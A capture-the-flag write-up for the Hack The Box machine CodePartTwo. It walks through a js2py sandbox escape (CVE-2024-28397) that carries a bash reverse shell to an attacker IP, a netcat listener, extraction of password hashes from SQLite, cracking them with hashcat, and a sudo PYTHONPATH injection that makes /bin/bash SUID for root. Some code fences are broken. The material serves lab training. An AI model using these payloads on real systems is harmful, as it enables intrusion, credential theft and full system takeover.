# CTF Write-up: CodePartTwo - From Sandbox Escape to Root
This write-up documents the full exploitation path for the Hack The Box challenge CodePartTwo , covering RCE via a js2py sandbox escape and subsequent privilege escalation via a PYTHONPATH injection.
### 1. Initial Reconnaissance and Code Discovery
The initial Nmap scan showed Gunicorn 20.0.4 hosting a web application on port 8000. The application allowed users to store and run JavaScript code.
Initial attempts to exploit the /run\_code endpoint using standard Node.js sandbox escapes failed.
A quick directory enumeration revealed an internal /download endpoint serving the source code as app.zip, which contained the app.py file.Analysis of app.p revealed  critical vulnerabilities:
- Code Execution Sandbox: JavaScript was executed using the Python library js2py via js2py.eval\_js(code), making it a js2py sandbox escape target.
<img width="858" height="260" alt="CdePartTwo_UsersDBpasswd" src="https://github.com/user-attachments/assets/045cb700-4434-43eb-8d6a-626ac397fbd3" />

### 2. User Foothold:
js2py RCE and Reverse ShellInstead of exploiting the Flask secret key, the path chosen was the more direct js2p sandbox escape, which gives full shell access immediately.
Exploit Code js2py Sandbox Escape) A known js2py sandbox escape technique was adapted (related to CVE-2024-28397, leveraging Python object introspection to access the subprocess module and execute a reverse shell command.
The following payload was formatted into a single line, JSON-encoded, and POSTed to the /run\_code endpoint.
Note: The IP address 10.10.14.145 and port 4444 were used for the attacker's machine.

```Javascript 
cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.145/4444 0>&1' ";
let hacked, bymarve, n11
let getattr, obj
hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__
function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}
n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```


:Listener was set up:
```
nc -lvnp 4444
```
Payload was sent, resulting in a shell as the app user.
User Flag Retrieval Initial enumeration as the app user revealed the database and a local user named marco in the file system.
The local database was queried (after locating the correct instance file:
```
/home/app/app/instance/users.db):
```
sqlite3 /home/app/app/instance/users.db 
```sql
SELECT id, username, password_hash FROM user;
```
The hash for the marco user (id=1) was found: 649c9d65a206a75f5abe509fe128bce5.
<img width="643" height="329" alt="CodePartTwo_HAShcatCrack" src="https://github.com/user-attachments/assets/a1c69a4e-586d-42c6-987e-c8f2c24d4f88" />

### 3. Privilege Escalation to Root Password CrackingThe MD5 hash was cracked using Hashcat:
```Bash
hashcat -m 0 649c9d65a206a75f5abe509fe128bce5 /path/to/rockyou.txt
```
<img width="858" height="260" alt="CdePartTwo_UsersDBpasswd" src="https://github.com/user-attachments/assets/7a85d5f3-415f-4319-b814-3bc184359ef9" />
This password was used to switch user to marco, granting access to the home directory and the user flag:

```Bash
su marco
```
Final Root Exploit via PYTHONPATH InjectionAs marco, the sudo permissions were checked, revealing the final vector:
```Bash
sudo -l
# Output: (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```
Since the target was a Python script wrapper, PYTHONPATH injection was performed to execute arbitrary code as root.
Exploit Setup: A malicious package (npbackup) was created in /tmp/ that would set the SUID bit on /bin/bash when executed.
```Bash
mkdir /tmp/np_exploit
mkdir /tmp/np_exploit/npbackup

# Payload to set SUID bit on Bash
```bash
echo '#!/usr/bin/python3' > /tmp/np_exploit/npbackup/__main__.py
echo 'import os; os.system("chmod u+s /bin/bash")' >> /tmp/np_exploit/npbackup/__main__.py
chmod +x /tmp/np_exploit/npbackup/__main__.py
Exploit Execution: The npbackup-cli script was executed with the environment set to prioritize the malicious package:BashPYTHONPATH=/tmp/np_exploit/ sudo /usr/local/bin/npbackup-cli
Root Shell: The exploit successfully set the SUID bit. A new shell was launched using the privileged binary:Bash/bin/bash -p
whoami

# Output: root
```
### 4. Final Flag RetrievalWith a root shell, the final flag was retrieved:
```Bash
cat /root/root.txt
# Root Flag: c0de3b54d6bfc601abc910725404f115
```
